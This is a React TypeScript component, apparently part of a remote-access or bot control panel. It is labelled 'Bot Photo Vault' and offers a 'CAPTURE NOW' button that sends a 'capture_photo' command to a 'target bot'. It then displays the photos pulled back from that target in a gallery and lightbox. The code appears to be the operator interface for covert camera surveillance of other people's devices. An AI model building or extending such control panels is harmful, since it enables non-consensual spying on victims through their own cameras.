'use client';

import { useEffect, useState } from 'react';
import { Camera, RefreshCcw, Clock3, X, Image as ImageIcon, Download } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { useImageCaptures } from '@/hooks/useFirebase';
import { sendCommand } from '@/services/targetService';
import { toast } from '@/lib/toast';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

interface PhotoGalleryProps {
  targetId?: string;
}

export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
  const { images, isLoading } = useImageCaptures(targetId);
  const [sending, setSending] = useState(false);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  const handleCapture = async () => {
    if (!targetId) return;
    setSending(true);
    try {
      await sendCommand(targetId, 'capture_photo');
      toast.success('Triggering camera on target bot...');
    } catch (error) {
      toast.error('Failed to send capture command.');
    } finally {
      setSending(false);
    }
  };

  return (
    <>
      <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
        <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between mb-6">
          <div>
            <p className="text-sm uppercase tracking-[0.3em] text-cyan-400/70">Intelligence</p>
            <h3 className="mt-2 text-2xl font-semibold text-white">Bot Photo Vault</h3>
            <p className="max-w-sm text-[11px] text-slate-500 uppercase font-mono mt-1">
              Data sinkronisasi otomatis dari Kei Bot Camera
            </p>
          </div>

          <button
            type="button"
            onClick={handleCapture}
            disabled={!targetId || sending}
            className={cn(
              'inline-flex items-center justify-center gap-2 rounded-2xl border px-5 py-2.5 text-xs font-bold uppercase transition-all',
              'border-cyan-500/30 bg-cyan-500/10 text-cyan-200 hover:border-cyan-400/70 hover:bg-cyan-500/15',
              (!targetId || sending) && 'cursor-not-allowed opacity-50'
            )}
          >
            <Camera size={14} />
            {sending ? 'REQUESTING...' : 'CAPTURE NOW'}
          </button>
        </div>

        <div className="grid grid-cols-2 gap-3 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar">
          {isLoading ? (
             [...Array(4)].map((_, i) => (
               <div key={i} className="aspect-square rounded-2xl bg-white/5 animate-pulse border border-white/5" />
             ))
          ) : !targetId ? (
            <div className="col-span-2 py-20 text-center text-slate-600 font-mono text-sm uppercase">Pilih target untuk akses vault</div>
          ) : images.length === 0 ? (
            <div className="col-span-2 py-20 text-center flex flex-col items-center gap-3">
               <ImageIcon size={32} className="text-slate-700" />
               <p className="text-slate-600 font-mono text-xs uppercase">Belum ada foto dari bot ini</p>
            </div>
          ) : (
            images.map((img) => (
              <div key={img.id} className="group relative aspect-square rounded-2xl overflow-hidden border border-white/10 bg-black/40">
                <img
                  src={img.url}
                  alt="Bot capture"
                  className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110 cursor-zoom-in"
                  onClick={() => setSelectedImage(img.url)}
                />
                <div className="absolute inset-x-0 bottom-0 p-3 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                   <p className="text-[10px] text-white font-mono">{new Date(img.timestamp).toLocaleString()}</p>
                </div>
              </div>
            ))
          )}
        </div>
      </section>

      {/* Lightbox */}
      {selectedImage && (
        <div
          className="fixed inset-0 z-[100] bg-black/95 backdrop-blur-md flex items-center justify-center p-4"
          onClick={() => setSelectedImage(null)}
        >
          <button className="absolute top-6 right-6 text-white/50 hover:text-white transition-colors">
            <X size={32} />
          </button>
          <img src={selectedImage} className="max-w-full max-h-full rounded-lg shadow-2xl border border-white/10" alt="Full view" />
        </div>
      )}
    </>
  );
}
